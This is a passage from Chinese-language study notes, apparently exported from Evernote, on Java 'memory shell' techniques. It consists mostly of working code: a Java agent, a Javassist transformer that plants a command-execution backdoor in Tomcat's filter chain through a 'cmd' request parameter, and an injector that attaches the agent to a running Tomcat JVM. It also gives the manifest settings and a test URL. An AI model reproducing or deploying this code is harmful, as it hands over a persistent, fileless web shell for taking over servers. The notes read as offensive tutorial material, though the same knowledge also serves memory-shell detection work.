2022/4/29 02:46
Evernote Export
file:///C:/Users/jiushi/Desktop/JavaWeb 内存马技术归纳.html
8/12
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
public class DefineTransformer implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer)
throws IllegalClassFormatException { //该接口用于被Agent调用Instrumentation添加的时候触发调用从而修改字节码
        System.out.println("premain load Class:" + className);
        return new byte[0];
    }
}
org/chabug/Agent.java
package org.chabug;
import java.lang.instrument.Instrumentation;
public class Agent {
    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("agentArgs : " + agentArgs);
        inst.addTransformer(new DefineTransformer(), true); //触发transform函数
    }
}
项目结构:
idea编译jar参考: https://xz.aliyun.com/t/9450#toc-1 (这里idea里设置MANIFEST.MF里的Premain-Class idea死活编译不进jar。最后还是手写MANIFEST.MF替换掉idea生成jar
的MANIFEST.MF)
最终输出结果
使用-javaagent:agent.jar参数执行
2022/4/29 02:46
Evernote Export
file:///C:/Users/jiushi/Desktop/JavaWeb 内存马技术归纳.html
9/12
在不重启的情况下修改Tomcat，注入Agent添加Filter
项目结构：
Agent.java
0.触发MyTransformer修改字java节码
1.遍历加载的class，判断类里面有没有org.apache.catalina.core.ApplicationFilterChain这个class
存在该class，调用retransformClasses重新加载class
package org.chabug;
import java.lang.instrument.Instrumentation;
public class Agent {
    public static String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static void agentmain(String agentArgs, Instrumentation inst) {
        System.out.println("Loading Agent...");
        inst.addTransformer(new MyTransformer(), true);
        Class[] loadedClasses=inst.getAllLoadedClasses();
        for(int i=0;i aClass, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws
IllegalClassFormatException {
        className = className.replace('/', '.');
        if (className.equals(ClassName)) {
            ClassPool cp = ClassPool.getDefault(); //返回默认的类池
            cp.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader())); //解决java.lang.ClassNotFoundException:
org.apache.catalina.core.ApplicationFilterChain （搜索当前上下文类加载器，添加到类默认池） 参考链接:https://www.yijinglab.com/specialized/20211214150751
            if (aClass != null) {
                ClassClassPath classPath = new ClassClassPath(aClass);
                cp.insertClassPath(classPath);
            }
            CtClass cc;
            try {
                cc = cp.get(className); //根据类路径名获取该类的CtClass对象 (cc变量)
                CtMethod m = cc.getDeclaredMethod("doFilter"); //实例化doFilter函数
                m.insertBefore(" javax.servlet.ServletRequest req = request;\n" +
                        "            javax.servlet.ServletResponse res = response;" +
                        "String cmd = req.getParameter(\"cmd\");\n" +
                        "if (cmd != null) {\n" +
                        "Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                        "new java.io.InputStreamReader(process.getInputStream()));\n" +
                        "StringBuilder stringBuilder = new StringBuilder();\n" +
                        "String line;\n" +
                        "while ((line = bufferedReader.readLine()) != null) {\n" +
                        "stringBuilder.append(line + '\\n');\n" +
                        "}\n" +
                        "res.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                        "res.getOutputStream().flush();\n" +
                        "res.getOutputStream().close();\n" +
                        "}"); //调用方法插入暗桩代码
                byte[] byteCode = cc.toBytecode(); //将一个类转成bytecode的方法toBytecode()
                cc.detach(); //释放内存
                return byteCode;
            } catch (NotFoundException | IOException | CannotCompileException e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
inject.java
1.tools.jar路径获取
2.获取系统加载器
3.获取addURL声明方法,java.net.URL.class
4.反射调用安全允许
5.接口调用
6.com.sun.tools.attach.VirtualMachine class加载实例化
7.com.sun.tools.attach.VirtualMachineDescriptor class加载实例化
8.MyVirtualMachine.getDeclaredMethod方法调用返回list Method对象，它反映此Class对象所表示的类或接口的指定已声明方法。
9.list接口调用
10.遍历list获取对应的jvm进程名
11.判断org.apache.catalina.startup.Bootstrap是否在指定的jvm名称里
获取对应的jvm对象
 获取VirtualMachineDescriptor.attach方法
attach接口注入jvm
loadAgent方法获取
loadAgent接口调用
最后释放内存
package org.chabug;
public class inject {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            System.out.println("Usage:inject.class xxxx");
            return;
        }
        String agentPath = args[0];
        try {
            java.io.File toolsJar = new java.io.File(System.getProperty("java.home").replaceFirst("jre", "lib") + java.io.File.separator + "tools.jar");
            java.net.URLClassLoader classLoader = (java.net.URLClassLoader) java.lang.ClassLoader.getSystemClassLoader();
            java.lang.reflect.Method add = java.net.URLClassLoader.class.getDeclaredMethod("addURL", new java.lang.Class[]{java.net.URL.class});
            add.setAccessible(true); //反射调用安全允许
            add.invoke(classLoader, new Object[]{toolsJar.toURI().toURL()}); //接口调用
            Class MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method list = MyVirtualMachine.getDeclaredMethod("list", new java.lang.Class[]{});
            java.util.List invoke = (java.util.List) list.invoke(null, new Object[]{});
            for (int i = 0; i < invoke.size(); i++) {
                Object o = invoke.get(i);
                java.lang.reflect.Method displayName = o.getClass().getSuperclass().getDeclaredMethod("displayName", new Class[]{});
                Object name = displayName.invoke(o, new Object[]{});
                System.out.println(String.format("find jvm process name:[[[" +
                        "%s" +
2022/4/29 02:46
Evernote Export
file:///C:/Users/jiushi/Desktop/JavaWeb 内存马技术归纳.html
11/12
                        "]]]", name.toString()));
                if (name.toString().contains("org.apache.catalina.startup.Bootstrap")) {
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{MyVirtualMachineDescriptor});
                    Object machine = attach.invoke(MyVirtualMachine, new Object[]{o});
                    java.lang.reflect.Method loadAgent = machine.getClass().getSuperclass().getSuperclass().getDeclaredMethod("loadAgent", new Class[]
{String.class});
                    loadAgent.invoke(machine, new Object[]{agentPath});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", new Class[]{});
                    detach.invoke(machine, new Object[]{});
                    System.out.println("inject tomcat done, break.");
                    System.out.println("check url http://localhost:8080/?cmd=whoami");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
MANIFEST.MF
Can-Redefine-Classes：为true时表示能够重新定义class
判断当前JVM的配置是否支持类的重新转换。开启该配置需要在 Agent的清单文件中添加Can-Retransform-Classes:true 配置。
Agent-Class指定
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: org.chabug.Agent
[空行]
[空行]
除去inject.java打包成jar。然后用inject.class调用
jar打包依赖缺少的坑：https://www.cnblogs.com/CoLo/p/15983041.html
效果如下
2022/4/29 02:46
Evernote Export
file:///C:/Users/jiushi/Desktop/JavaWeb 内存马技术归纳.html
12/12
对于注入后的内存马，可以分为两个类型
组件注入型 - 注入Servlet、Filter、Listener、Controller等
Agent注入型 - 注入字节码
参考链接:
https://mp.weixin.qq.com/s/F_NI93dvc59RY9kwIQpg8g
https://xz.aliyun.com/t/10358#toc-4
https://www.cnblogs.com/knowledgemine/p/12702376.html
https://juejin.cn/post/6942834983606321189 tomcat启动加载流程
https://y4er.com/post/javaagent-tomcat-memshell/